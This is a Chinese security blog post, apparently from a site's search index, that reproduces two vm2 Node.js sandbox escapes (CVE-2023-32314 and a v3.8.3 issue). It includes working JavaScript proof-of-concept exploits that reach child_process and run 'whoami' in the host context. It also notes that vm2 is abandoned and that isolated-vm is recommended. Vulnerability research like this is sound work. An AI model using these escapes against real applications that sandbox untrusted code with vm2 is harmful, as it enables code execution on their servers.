href="#VM2沙箱逃逸-v3-9-17，CVE-2023-32314" class="headerlink" title="VM2沙箱逃逸( v3.9.17，CVE-2023-32314)"></a>VM2沙箱逃逸( v3.9.17，CVE-2023-32314)</h1><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p><code>3.9.17</code> 及以下版本的 <code>vm2</code> 中存在沙盒逃逸漏洞。它滥用基于代理规范的宿主对象的意外创建，并允许<code>Function</code> 在宿主上下文中通过导致 <code>RCE</code> 。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p><code>Vm2 &lt;= 3.9.17</code> </p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><img src="/imgs/1690893929063.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install vm2@3.9.17</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; <span class="variable constant_">VM</span> &#125; = <span class="built_in">require</span>(<span class="string">&quot;vm2&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title function_">VM</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">  const err = new Error();</span></span><br><span class="line"><span class="string">  err.name = &#123;</span></span><br><span class="line"><span class="string">    toString: new Proxy(() =&gt; &quot;&quot;, &#123;</span></span><br><span class="line"><span class="string">      apply(target, thiz, args) &#123;</span></span><br><span class="line"><span class="string">        const process = args.constructor.constructor(&quot;return process&quot;)();</span></span><br><span class="line"><span class="string">        throw process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();</span></span><br><span class="line"><span class="string">      &#125;,</span></span><br><span class="line"><span class="string">    &#125;),</span></span><br><span class="line"><span class="string">  &#125;;</span></span><br><span class="line"><span class="string">  try &#123;</span></span><br><span class="line"><span class="string">    err.stack;</span></span><br><span class="line"><span class="string">  &#125; catch (stdout) &#123;</span></span><br><span class="line"><span class="string">    stdout;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(vm.<span class="title function_">run</span>(code));</span><br></pre></td></tr></table></figure><p><img src="/imgs/1690893824209.png"></p><h1 id="VM2沙箱逃逸（v3-8-3）"><a href="#VM2沙箱逃逸（v3-8-3）" class="headerlink" title="VM2沙箱逃逸（v3.8.3）"></a>VM2沙箱逃逸（v3.8.3）</h1><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install vm2@3.8.3</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;<span class="variable constant_">VM</span>&#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">&#x27;(&#x27;</span> + <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">TypeError</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">get_process</span> = <span class="function"><span class="params">f</span>=&gt;</span>f.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;return process&quot;</span></span>)(<span class="params"></span>);</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="title class_">Object</span>.<span class="title function_">preventExtensions</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&quot;&quot;</span>)).<span class="property">a</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e.<span class="title function_">get_process</span>(<span class="function">()=&gt;</span>&#123;&#125;).<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;whoami&quot;</span>).<span class="title function_">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;+<span class="string">&#x27;)()&#x27;</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload</code> 来自 <code>https://github.com/patriksimek/vm2/issues/225</code> 。</p><h1 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h1><p>现在 <code>VM2</code> 这个项目作者已经不再维护了，并且作者建议我们不要在生产环境用这个项目了。因为 <code>Node</code> 日益复杂，防止 <code>Node</code> 沙箱逃逸是一件日益复杂的事情。而且主要是因为这个项目使用的防止逃逸的策略被证实是不当的，最新版本的 <code>VM2</code> 项目也存在沙箱逃逸，并且作者发现如果进一步防止沙箱逃逸需要更改整个项目的代码架构策略，因此作者选择了放弃。作者建议我们选择 <code>isolated-vm</code> 这个项目。这个项目选择了不同的思路但是一样有效的方式来防止沙箱逃逸。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://zhuanlan.zhihu.com/p/617758104</span><br><span class="line">https://pythonjishu.com/dxmuzvsyrdduifx/</span><br><span class="line">https://github.com/patriksimek/vm2/security/advisories/GHSA-7jxr-cg7f-gpgv</span><br><span class="line">https://github.com/patriksimek/vm2</span><br><span class="line">https://github.com/patriksimek/vm2/issues/225</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Nodejs </category>
          
          <category> 沙箱逃逸 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nodejs </tag>
            
            <tag> 沙箱逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
